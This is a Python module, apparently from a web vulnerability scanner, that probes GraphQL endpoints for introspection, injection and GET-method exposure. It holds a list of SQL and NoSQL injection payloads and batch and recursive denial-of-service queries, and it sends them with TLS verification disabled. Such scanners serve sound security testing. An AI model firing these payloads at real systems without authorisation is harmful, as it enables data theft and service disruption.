import requests
import json

# GraphQL introspection query
INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
"""

# GraphQL injection payloads
GRAPHQL_INJECTION_PAYLOADS = [
    # SQL injection in GraphQL
    '''{ user(id: "1' OR '1'='1") { name email } }''',
    
    # NoSQL injection
    '''{ user(id: {"$ne": null}) { name email } }''',
    
    # Batch query attack (DoS)
    '''{ user1: user(id: 1) { name } user2: user(id: 2) { name } }''' * 10,
    
    # Recursive query (DoS)
    '''{ user { posts { author { posts { author { name } } } } } }''',
    
    # Field suggestion attack
    '''{ __type(name: "User") { fields { name } } }''',
]

def test_graphql_introspection(url):
    """Test apakah GraphQL introspection enabled."""
    results = []
    
    # Common GraphQL endpoints
    graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/graphql/v1', '/query']
    
    for path in graphql_paths:
        test_url = url.rstrip('/') + path
        
        try:
            response = requests.post(
                test_url,
                json={"query": INTROSPECTION_QUERY},
                headers={"Content-Type": "application/json"},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if '__schema' in str(data) or 'types' in str(data):
                        types = []
                        if 'data' in data and '__schema' in data['data']:
                            types = [t['name'] for t in data['data']['__schema']['types'][:5]]
                        
                        results.append({
                            "type": "GraphQL Introspection Enabled",
                            "severity": "MEDIUM",
                            "param": path,
                            "payload": "Introspection Query",
                            "detail": f"Schema exposed. Types found: {', '.join(types) if types else 'Yes'}"
                        })
                        return results  # Found, no need to check other paths
                except:
                    pass
        except requests.RequestException:
            pass
    
    return results

def test_graphql_injection(url):
    """Test GraphQL injection vulnerabilities."""
    results = []
    
    graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql']
    
    for path in graphql_paths:
        test_url = url.rstrip('/') + path
        
        for payload in GRAPHQL_INJECTION_PAYLOADS[:3]:  # Test first 3 payloads
            try:
                response = requests.post(
                    test_url,
                    json={"query": payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    verify=False
                )
                
                if response.status_code == 200:
                    body = response.text.lower()
                    
                    # Check for SQL errors
                    sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite"]
                    if any(err in body for err in sql_errors):
                        results.append({
                            "type": "GraphQL SQL Injection",
                            "severity": "CRITICAL",
                            "param": path,
                            "payload": payload[:50] + "...",
                            "detail": "SQL error detected in GraphQL response"
                        })
                        return results
                    
                    # Check for excessive data (batch attack)
                    if len(response.text) > 50000:
                        results.append({
                            "type": "GraphQL Batch Query Attack",
                            "severity": "HIGH",
                            "param": path,
                            "payload": "Batch query",
                            "detail": f"Large response ({len(response.text)} bytes) - possible DoS vector"
                        })
                        return results
                        
            except requests.RequestException:
                pass
    
    return results

def test_graphql_security(url):
    """Comprehensive GraphQL security test."""
    results = []
    
    # Test introspection
    results.extend(test_graphql_introspection(url))
    
    # Test injection
    results.extend(test_graphql_injection(url))
    
    # Test for common misconfigurations
    graphql_paths = ['/graphql', '/api/graphql']
    for path in graphql_paths:
        test_url = url.rstrip('/') + path
        
        try:
            # Test GET method (should be disabled)
            response = requests.get(test_url, timeout=10, verify=False)
            if response.status_code == 200 and 'graphql' in response.text.lower():
                results.append({
                    "type": "GraphQL GET Method Enabled",
                    "severity": "MEDIUM",
                    "param": path,
                    "payload": "GET request",
                    "detail": "GraphQL accepts GET requests - CSRF risk"
                })
                break
        except:
            pass
    
    return results
